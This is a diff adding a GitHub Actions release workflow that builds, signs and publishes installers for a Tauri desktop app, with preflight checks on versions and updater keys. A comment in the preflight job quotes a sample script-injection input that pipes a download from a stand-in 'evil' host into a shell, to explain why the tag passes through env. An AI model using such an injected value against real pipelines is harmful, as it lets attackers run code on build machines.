@@ -1,0 +1,278 @@
+# FT-52 — the 3-OS release pipeline.
+#
+# Tag `vX.Y.Z` (matching `src-tauri/tauri.conf.json`'s `version`) and this
+# builds Windows NSIS + MSI, a macOS universal DMG, and Linux AppImage + deb,
+# then publishes them on a GitHub release marked `--latest` together with the
+# `latest.json` the in-app updater reads.
+#
+# ⚠️ NEVER RUN. This workflow has not executed once — no tag has ever been
+# pushed and the signing secrets below do not exist yet. Read it as reviewed
+# intent, not as a proven pipeline, and expect the first tag to need a fix.
+# Three things in particular are unverified and are called out inline:
+#   1. the MSI version ceiling (see `preflight` — this one is expected to bite),
+#   2. whether the updater pubkey matches the key that actually signs, and
+#   3. whether the site's download links resolve against the real asset names.
+#
+# Required repository secrets — every one of them optional-by-design, so a
+# release still builds unsigned rather than failing at the last step:
+#
+#   TAURI_SIGNING_PRIVATE_KEY           minisign private key for the updater
+#   TAURI_SIGNING_PRIVATE_KEY_PASSWORD  its passphrase
+#   APPLE_CERTIFICATE                   base64 .p12 for Developer ID signing
+#   APPLE_CERTIFICATE_PASSWORD          its passphrase
+#   APPLE_SIGNING_IDENTITY              e.g. "Developer ID Application: … (TEAMID)"
+#   APPLE_ID / APPLE_PASSWORD / APPLE_TEAM_ID   notarisation
+#   WINDOWS_CERTIFICATE / WINDOWS_CERTIFICATE_PASSWORD   Authenticode
+#
+# Generate the updater keypair with `npm run tauri signer generate -- -w
+# .tauri/freally-teleprompt.key`. `.tauri/` is gitignored; the PUBLIC half goes
+# into `tauri.conf.json`'s `plugins.updater.pubkey`, the private half into the
+# secret above and nowhere else.
+name: Release
+
+on:
+  push:
+    tags: ["v*"]
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: "Tag to build (must already exist)"
+        required: true
+
+permissions:
+  contents: write
+
+env:
+  CARGO_TERM_COLOR: always
+
+jobs:
+  # A cheap job that refuses to start a 40-minute matrix over a mistake that is
+  # visible in two files. Both of these have shipped broken in sibling apps.
+  preflight:
+    name: Preflight (version + updater key)
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      # The version lives in FOUR files, not two: the workspace `Cargo.toml`
+      # (which `src-tauri/Cargo.toml` inherits) and `ui/package.json` carry it
+      # as well. Checking a sample of them is worse than not checking, because
+      # it reads as "verified" — a Cargo.toml left behind ships a binary whose
+      # own `--version` and crash-report header disagree with the release it
+      # came from.
+      - name: The tag and all four version files must agree
+        # The tag arrives through `env`, NOT as a `${{ }}` inside the script.
+        # A `${{ }}` in a `run:` block is TEXTUALLY substituted before the shell
+        # ever sees it, so a workflow_dispatch input of `x"; curl evil|sh; #`
+        # would execute — the classic Actions script-injection. Through `env`
+        # it is just a string in a variable.
+        env:
+          RAW_TAG: ${{ github.event.inputs.tag || github.ref_name }}
+        run: |
+          want="${RAW_TAG#v}"
+          fail=0
+          check() {
+            echo "  $1 = $2"
+            [ "$2" = "$want" ] || { echo "::error::$1 says $2, the tag says $want"; fail=1; }
+          }
+          echo "tag = $want"
+          check src-tauri/tauri.conf.json "$(node -p "require('./src-tauri/tauri.conf.json').version")"
+          check package.json              "$(node -p "require('./package.json').version")"
+          check ui/package.json           "$(node -p "require('./ui/package.json').version")"
+          # The one TOML: `[workspace.package] version = "x.y.z"`, the first
+          # bare `version =` in the file.
+          check Cargo.toml "$(grep -m1 -E '^version *= *"' Cargo.toml | sed -E 's/.*"(.*)".*/\1/')"
+          [ "$fail" = 0 ]
+
+      # ⚠️ The trap this repo's version ladder walks straight into.
+      #
+      # An MSI ProductVersion is `major.minor.build` with major and minor capped
+      # at 255 and build at 65535. The phase ladder used so far — 0.100.0,
+      # 0.200.0, 0.300.0 — has a MINOR of 100/200/300, and 300 is over the
+      # ceiling. So `0.300.0` cannot produce a valid MSI at all, and the first
+      # real tag is where that surfaces.
+      #
+      # This check states it out loud rather than letting WiX fail forty minutes
+      # in with a message about a product version. The fix is a versioning
+      # decision, not a code change: ship 1.0.0 (minor 0 — fine), renumber the
+      # ladder, or drop `msi` from `bundle.targets` and ship NSIS only. NSIS has
+      # no such limit, and it is what `latest.json` points the updater at anyway.
+      - name: MSI version ceiling (major/minor <= 255)
+        run: |
+          version=$(node -p "require('./src-tauri/tauri.conf.json').version")
+          targets=$(node -p "JSON.stringify(require('./src-tauri/tauri.conf.json').bundle.targets)")
+          major=${version%%.*}; rest=${version#*.}; minor=${rest%%.*}
+          if [ "$major" -le 255 ] && [ "$minor" -le 255 ]; then
+            echo "version $version is MSI-representable"
+          elif echo "$targets" | grep -q '"msi"'; then
+            echo "::error::version $version has minor=$minor (> 255), which cannot be an MSI ProductVersion, and bundle.targets still includes msi. Renumber the release or drop the msi target."
+            exit 1
+          else
+            echo "::warning::version $version is not MSI-representable, but msi is not a bundle target — continuing."
+          fi
+
+      # The updater fails SILENTLY when the bundled public key is not the one
+      # that signed `latest.json`: every update is rejected as untrusted and the
+      # user is simply never offered one. This bit Sourcerer. An empty pubkey is
+      # the state this repo has shipped since Phase 0 — it fails safe (nothing
+      # installs) but it also means auto-update cannot work for anyone.
+      - name: Updater key sanity
+        # The signing key comes through `env` and is only ever tested for
+        # emptiness. Interpolating a secret as `${{ }}` inside a `run:` block
+        # pastes its literal text into the script — a multi-line key would
+        # break the shell outright, and anything that echoes the script (a
+        # `set -x`, a syntax error) prints it. Masking is not a substitute for
+        # not putting it there.
+        env:
+          HAVE_SIGNING_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY != '' }}
+        run: |
+          pubkey=$(node -p "require('./src-tauri/tauri.conf.json').plugins.updater.pubkey || ''")
+          if [ -z "$pubkey" ]; then
+            if [ "$HAVE_SIGNING_KEY" = "true" ]; then
+              echo "::error::a signing key is configured but tauri.conf.json ships an EMPTY pubkey — every update would be rejected as untrusted. Put the public half in plugins.updater.pubkey."
+              exit 1
+            fi
+            echo "::warning::no updater keypair yet (FT-51). This release will not be auto-updatable; the in-app check will find it and refuse to install it."
+          fi
+
+  build:
+    name: Build (${{ matrix.os }})
+    needs: preflight
+    runs-on: ${{ matrix.os }}
+    timeout-minutes: 90
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          # One universal DMG rather than two per-arch builds, so the site has a
+          # single macOS link to point at.
+          - os: macos-latest
+            args: "--target universal-apple-darwin"
+            rust-targets: "aarch64-apple-darwin,x86_64-apple-darwin"
+          - os: ubuntu-latest
+            args: ""
+            rust-targets: ""
+          - os: windows-latest
+            args: ""
+            rust-targets: ""
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.inputs.tag || github.ref }}
+
+      - name: Install Linux prerequisites
+        if: matrix.os == 'ubuntu-latest'
+        uses: ./.github/actions/linux-deps
+
+      - name: Install the pinned toolchain
+        run: rustup toolchain install
+      - name: Add the macOS cross targets
+        if: matrix.rust-targets != ''
+        # Through `env` like every other value this file feeds a shell. The
+        # matrix is authored here rather than supplied by a caller, so this one
+        # is not exploitable — but "is this particular interpolation safe?" is
+        # a question worth never having to ask twice.
+        env:
+          TARGETS: ${{ matrix.rust-targets }}
+        run: rustup target add $(echo "$TARGETS" | tr ',' ' ')
+      - uses: Swatinem/rust-cache@v2
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+          cache: npm
+      - run: npm ci
+
+      # macOS code signing, guarded.
+      #
+      # The guard is the point: setting `APPLE_CERTIFICATE` to an EMPTY string
+      # still *sets the variable*, and Tauri then tries to sign with an empty
+      # certificate and produces a DMG that looks signed and is not. So the
+      # secrets are only exported when the certificate is actually non-empty,
+      # and the release says out loud which way it went.
+      - name: Decide whether macOS signing is possible
+        if: matrix.os == 'macos-latest'
+        id: mac-signing
+        env:
+          CERT: ${{ secrets.APPLE_CERTIFICATE }}
+        run: |
+          if [ -n "$CERT" ]; then
+            echo "enabled=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "enabled=false" >> "$GITHUB_OUTPUT"
+            echo "::warning::APPLE_CERTIFICATE is unset — the macOS build will be UNSIGNED and Gatekeeper will refuse it without a right-click Open."
+          fi
+
+      - name: Build, bundle and publish
+        uses: tauri-apps/tauri-action@v0
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Updater signing. Absent means the bundles carry no `.sig`, and
+          # `latest.json` is emitted with empty signatures — an update the app
+          # will find and then refuse, which is the safe direction.
+          TAURI_SIGNING_PRIVATE_KEY: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY }}
+          TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
+          # Only ever non-empty when the guard above said so.
+          APPLE_CERTIFICATE: ${{ steps.mac-signing.outputs.enabled == 'true' && secrets.APPLE_CERTIFICATE || '' }}
+          APPLE_CERTIFICATE_PASSWORD: ${{ steps.mac-signing.outputs.enabled == 'true' && secrets.APPLE_CERTIFICATE_PASSWORD || '' }}
+          APPLE_SIGNING_IDENTITY: ${{ steps.mac-signing.outputs.enabled == 'true' && secrets.APPLE_SIGNING_IDENTITY || '' }}
+          APPLE_ID: ${{ steps.mac-signing.outputs.enabled == 'true' && secrets.APPLE_ID || '' }}
+          APPLE_PASSWORD: ${{ steps.mac-signing.outputs.enabled == 'true' && secrets.APPLE_PASSWORD || '' }}
+          APPLE_TEAM_ID: ${{ steps.mac-signing.outputs.enabled == 'true' && secrets.APPLE_TEAM_ID || '' }}
+        with:
+          tagName: ${{ github.event.inputs.tag || github.ref_name }}
+          releaseName: "Freally Teleprompt __VERSION__"
+          releaseBody: "See CHANGELOG.md for what changed. Downloads for Windows, macOS and Linux are attached below."
+          # Published as a DRAFT so a half-finished matrix is never the thing
+          # users see, and so the `publish` job below can check the assets before
+          # anything goes live.
+          releaseDraft: true
+          prerelease: false
+          # Emits `latest.json` next to the installers — the file the in-app
+          # updater fetches. Tauri points it at the NSIS and AppImage, never the
+          # .msi/.deb, which is correct: those two are the only targets the
+          # updater plugin can install in place.
+          includeUpdaterJson: true
+          args: ${{ matrix.args }}
+
+  # Nothing is visible to a user until this passes. A draft release with a
+  # missing platform is a support ticket; a published one is a bad afternoon.
+  publish:
+    name: Verify the assets, then publish --latest
+    needs: build
+    runs-on: ubuntu-latest
+    # No `actions/checkout` on purpose: nothing here reads a repo file, and this
+    # repo carries ~12 MB of generated dictionary JSON. `GH_REPO` tells `gh`
+    # which repository to act on, which is the only thing the clone was for.
+    env:
+      GH_REPO: ${{ github.repository }}
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      TAG: ${{ github.event.inputs.tag || github.ref_name }}
+    steps:
+      - name: Every platform is present, and latest.json points at the right ones
+        run: |
+          # `jq` is deliberately not used — it is not installed everywhere this
+          # repo's tooling runs, so `gh --jq` does the filtering server-side.
+          names=$(gh release view "$TAG" --json assets --jq '.assets[].name')
+          echo "$names"
+          fail=0
+          for want in '\.exe$' '\.msi$' '\.dmg$' '\.AppImage$' '\.deb$' '^latest\.json$'; do
+            echo "$names" | grep -qE "$want" || { echo "::error::no asset matching $want"; fail=1; }
+          done
+          # The updater must be pointed at the in-place-installable targets. An
+          # updater endpoint naming the .msi or the .deb resolves and then fails
+          # on every machine — learned the hard way in Freally Capture.
+          gh release download "$TAG" --pattern latest.json --output latest.json --clobber
+          node -e '
+            const j = require("./latest.json");
+            const bad = Object.entries(j.platforms || {}).filter(([, p]) => /\.(msi|deb|rpm)$/.test(p.url));
+            if (bad.length) { console.error("::error::latest.json names a non-updatable target: " + bad.map(b => b[0]).join(", ")); process.exit(1); }
+            const unsigned = Object.entries(j.platforms || {}).filter(([, p]) => !p.signature);
+            if (unsigned.length) console.error("::warning::latest.json has no signature for: " + unsigned.map(b => b[0]).join(", ") + " — the updater will refuse these.");
+          '
+          [ "$fail" = 0 ]
+
+      - name: Publish it as the latest release
+        # `--latest` is not decoration: without it the updater endpoint
+        # (`releases/latest/download/latest.json`) never resolves, and neither do
+        # the site's download links, which use the same `/latest/` path.
+        run: gh release edit "$TAG" --draft=false --latest
